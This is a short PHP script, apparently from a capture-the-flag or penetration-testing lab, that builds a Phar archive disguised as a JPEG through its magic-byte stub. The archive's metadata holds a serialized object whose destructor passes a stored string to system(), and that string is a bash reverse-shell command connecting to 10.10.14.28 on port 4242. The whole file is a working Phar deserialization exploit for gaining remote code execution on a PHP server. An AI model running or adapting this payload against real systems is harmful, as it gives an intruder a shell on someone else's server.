<?php

class AnyClass {
	public $data = null;
	public function __construct($data) {
		$this->data = $data;
	}
	
	function __destruct() {
		system($this->data);
	}
}

// create new Phar
$phar = new Phar('test2.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('bash -i >& /dev/tcp/10.10.14.28/4242 0>&1');
$phar->setMetadata($object);
$phar->stopBuffering();
